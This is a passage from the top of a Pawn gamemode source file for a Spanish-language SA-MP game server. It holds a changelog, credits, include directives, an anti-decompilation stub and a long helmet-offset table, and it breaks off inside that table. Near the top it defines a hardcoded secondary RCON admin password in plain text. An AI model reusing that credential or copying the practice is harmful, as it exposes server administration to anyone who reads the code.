//ACTUALIZACIONES
/*

» = ALT+175

12/05/2021

*Timers agregados a la GuerraTotal. Además nuevos comandos GuerraTotalOn y GuerraTotalOff.
*Solucionado bugs de negocios.
*Implementación de un sistema de carga de negocios mejorado, en el cual cargue los dueños de los negocios directamente desde los usuarios del sistema de administración Ladmin (en proceso)

18/05/2021
*Solución al problema de poder utilizar el comando /armas en deathmatchs.
*Solución a las explosiones del SniperDM (se activaban las balas explosivas luego de la primera muerte, pero tenian que activarse cuando el jugador digitara el comando /sniperdm).
*Las explosiones de SniperDM ahora son mas grandes.
*Solución al bug cuando se utiliza el comando /salir que sino estabas en ningun deathmatch, carrera, derby o en tu casa te mandaba a las coordenadas 0,0,0.
*Solución a problemas al devolver armas guardadas y mejor reutilización del código.
*Modificación del comando /reglas.
*Nuevo sistema de globo aerostático.
*Nuevos comandos /bug y /sugerencia.
*Nuevos comandos /sexo y /sexo2.

19/05/2021
*Nuevo sistema de control del vehiculo, comando /vcontrol.
*Nuevo dialog agregado, tercera página de OtherCmds.

23/05/2021
*Se agrego el comando /drogas.
*Se acomodaron los DIALOGS del comando /othercmds.
*Se subio todo el proyecto a GitHub y ahora se maneja el control de versiones a traves de Git.
*Se añadió una función a el sistema de carreras. Ahora cuando el usuario presione la tecla "Y" volverá al ultimo CheckPoint atravesado.

*/
//-----------------------------Credits go to:
//Some of the SF Classes by Cam
//Selection Screen Sounds by CodeMaster
//Multi Language Code by Yom
//Race Script by Yagu
//Business System and XVM coded by tAxI
//Simple House Systems by Antironix, Saver Addon by Leopard
//Gang script taken from Jax's LVDM ~MoneyGrub(+LandGrab)
//CAR MENU ShopSystem by Darkimmortal
//OLD Police gate Locations By Splitx
//Current AutoGates by Thomas_Conroy
//shamal > androm code copied from BeckyBoiz. full credit to him.
//Job Script by BMUK
//Gang Zone War System by Kovalski
//Streamer Plugin by Incognito
//Spawn text draws and SF zone positions by TheKingWillem and MadeMan
//Houes Spawns By Tedy77
//BETA TESTER and Server Host Virtual_Pancake aka Rob
//ffind from YSF by Y-Less
//1440/1761 Houses by BlackMamba
//MoNeYPiMp Made this Gamemode
/*------------------------MULTI LANGUAGE FORMAT EXAMPLE!!!----------------------
	if((strcmp(cmdtext,"/help",true) == 0)|| // if in english
	(strcmp(cmdtext,"/aide",true) == 0)) // If in French
   	{
		switch (Language[playerid])
		{
			case 0:
			{
				SendClientMessage(playerid,0xFFD400AA,"HELP:");
				SendClientMessage(playerid,0xFFD400AA,"Type /lock to close your vehicle.");
				SendClientMessage(playerid,0xFFD400AA,"Type /unlock to open your vehicle.");
			}
			case 1:
			{
				SendClientMessage(playerid,0xFFD400AA,"AIDE:");
				SendClientMessage(playerid,0xFFD400AA,"Tape /lock pour fermer ton vehicule.");
				SendClientMessage(playerid,0xFFD400AA,"Tape /unlock pour ouvrir ton vehicule.");
			}
		}
		return 1;
	}f
*/
//===============================Include Files==================================
#include <a_samp>
#undef  MAX_PLAYERS
#define MAX_PLAYERS                                            (30)

#include <lethaldudb2>
#include <KZI>
#include <AntiMoneyHack>
#include <streamer>
#include <YSF>
#include <zcmd>
#include <CleoFuck>
#include <sscanf2>
#include <geolocation>
#include <AntiFC>
#include <mSelection>
#include <foreach>
#include <xFireworks>


#pragma tabsize 0

//==============================================================================
AntiDeAMX()
{
   new a[][] =
   {
      "Unarmed (Fist)",
      "Brass K"
   };
   #pragma unused a
}
//==============================================================================
#define HOSTNAME               "===>[DESTRUCCION LATINA FR]<===[Ultra-H.com]"
//#define HOSTNAME               "|————————|» DL EN ACTUALIZACION «|————————| [Ultra-H.com]"
#define MAPNAME               "[Español/Spanish]"
#define LANGUAGE               "[Español/Spanish]"
#define SecondaryRconPass "3425584466DLFR-2021"
#define DIALOG_TYPE_SecondaryRcon           2013
new Attempts[MAX_PLAYERS];
////////////////////////////////////////////////////////////////////////////////
new SoloSuenaUnaVez[MAX_PLAYERS];//MUSICA SPAWN

//===============================|Nuevas Cosas|=================================
new Float: PosCP_X,
Float: PosCP_Y,
Float: PosCP_Z;

enum Datos
{
	UsaDrogas
};
new INFO[MAX_PLAYERS][Datos];
#if defined Drogas
#endif
#define Drogas 1042
new Control[MAX_PLAYERS][12];
#define   DIALOGO_CONTROL  1234    //CONTROL DEL VEHICULO (ABRIR CAPO, MALETEO, ALARMA, ETC)
#define AnimSexo                14268
#define Sexo 1540
#define DIALOG_SUGERENCIA      	2003
#define DIALOG_BUG             	2002
new CantidadBug[MAX_PLAYERS];
new CantidadSugerencia[MAX_PLAYERS];
///============================== Sistema de globo aerostático ===================================//
new GloboCreado, g_1, Float:pos_data[3];
//==================================================================================================
forward DropPlayerWeapons(playerid);
forward GetWeaponModel(weaponid);
forward DeletePickup(pickupid);
forward ColorUpdate(playerid);
//Autos con objetos
new Obj[31];
new Obj1[2];
new vehobj;
new veh1;
//CASCO
#define SLOT 1
     new Float:HelmetPos[][6] = {
     {0.070000, 0.000000, 0.000000, 88.000000, 75.000000, 0.000000}, //skin 0
     {0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}, //skin 1
     {0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}, //skin 2
     {0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}, //skin 3
     {0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}, //skin 4
     {0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}, //skin 5
     {0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}, //skin 6
     {0.090000, 0.019999, 0.000000, 88.000000, 90.000000, 0.000000}, //skin 7
     {0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}, //skin 8
     {0.059999, 0.019999, 0.000000, 88.000000, 90.000000, 0.000000}, //skin 9
     {0.090000, 0.019999, 0.000000, 88.000000, 90.000000, 0.000000}, //skin 10
     {0.070000, 0.019999, 0.000000, 88.000000, 90.000000, 0.000000}, //skin 11
     {0.070000, 0.019999, 0.000000, 88.000000, 90.000000, 0.000000}, //skin 12
     {0.070000, 0.019999, 0.000000, 88.000000, 90.000000, 0.000000}, //skin 13
     {0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}, //skin 14
     {0.059999, 0.000000, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 15
     {0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}, //skin 16
     {0.059999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 17
     {0.059999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 18
     {0.059999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 19
     {0.059999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 20
     {0.059999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 21
     {0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}, //skin 22
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 23
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 24
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 25
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 26
     {0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}, //skin 27
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 28
     {0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}, //skin 29
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 30
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 31
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 32
     {0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}, //skin 33
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 34
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 35
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 36
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 37
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 38
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 39
     {0.050000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 40
     {0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}, //skin 41
     {0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}, //skin 42
     {0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}, //skin 43
     {0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}, //skin 44
     {0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}, //skin 45
     {0.070000, 0.019999, 0.000000, 88.000000, 83.000000, 0.000000}, //skin 46
     {0.070000, 0.019999, 0.000000, 88.000000, 83.000000, 0.000000}, //skin 47
     {0.070000, 0.019999, 0.000000, 88.000000, 83.000000, 0.000000}, //skin 48
     {0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}, //skin 49
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 50
     {0.100000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 51
     {0.100000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 52
     {0.100000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 53
     {0.100000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 54
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 55
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 56
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 57
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 58
     {0.079999, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 59
     {0.079999, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 60
     {0.079999, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 61
     {0.079999, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 62
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 63
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 64
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 66
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 67
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 68
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 69
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 70
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 71
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 72
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 73
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 75
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 76
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 78
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 79
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 80
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 81
     {0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}, //skin 82
     {0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}, //skin 83
     {0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}, //skin 84
     {0.070000, 0.039999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 85
     {0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}, //skin 86
     {0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}, //skin 87
     {0.070000, 0.039999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 88
     {0.070000, 0.039999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 89
     {0.050000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 90
     {0.050000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 91
     {0.050000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 92
     {0.050000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 93
     {0.050000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 94
     {0.050000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 95
     {0.050000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 96
     {0.050000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 97
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 98
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 99
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 100
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 101
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 102
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 103
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 104
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 105
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 106
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 107
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 108
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 109
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 110
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 111
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 112
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 113
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 114
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 115
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 116
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 117
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 118
     {0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}, //skin 119
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 120
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 121
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 122
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 123
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 124
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 125
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 126
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 127
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 128
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 129
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 130
     {0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 131
     {0.000000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 132
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 133
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 134
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 135
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 136
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 137
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 138
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 139
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 140
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 141
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 142
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 143
     {0.090000, 0.000000, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 144
     {0.090000, 0.000000, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 145
     {0.090000, 0.000000, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 146
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 147
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 148
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 150
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 151
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 152
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 153
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 154
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 155
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 156
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 157
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 158
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 159
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 160
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 161
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 162
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 163
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 164
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 165
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 166
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 167
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 168
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 169
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 170
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 171
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 172
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 173
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 174
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 175
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 176
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 177
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 178
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 179
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 180
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 181
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 182
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 183
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 184
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 185
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 186
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 187
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 188
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 189
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 190
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 191
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 192
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 193
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 194
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 195
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 196
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 197
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 198
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 199
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 200
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 201
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 202
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 203
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 204
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 205
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 206
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 207
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 209
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 210
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 211
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 212
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 213
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 214
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 215
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 216
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 217
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 218
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 219
     {0.029999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 220
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 221
     {0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 222
     {0.070000, 0.050000, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 223
     {0.070000, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 224
     {0.070000, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 225
     {0.070000, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 226
     {0.070000, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 227
     {0.070000, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 228
     {0.070000, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 229
     {0.070000, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 230
     {0.070000, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 231
     {0.070000, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 232
     {0.070000, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 233
     {0.070000, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 234
     {0.070000, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 235
     {0.070000, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 236
     {0.070000, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 237
     {0.070000, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 238
     {0.070000, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 239
     {0.070000, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 240
     {0.070000, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 241
     {0.070000, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 242
     {0.070000, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 243
     {0.070000, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 244
     {0.070000, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 245
     {0.070000, 0.050000, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 246
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 247
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 248
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 249
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 250
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 251
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 252
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 253
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 254
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 255
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 256
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 257
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 258
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 259
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 260
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 261
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 262
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 263
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 264
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 265
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 266
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 267
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 268
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 269
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 270
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 271
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 272
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 274
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 275
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 276
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 277
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 278
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 279
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 280
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 281
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 282
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 283
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 284
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 285
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 286
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 287
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 288
     {0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}, //skin 289
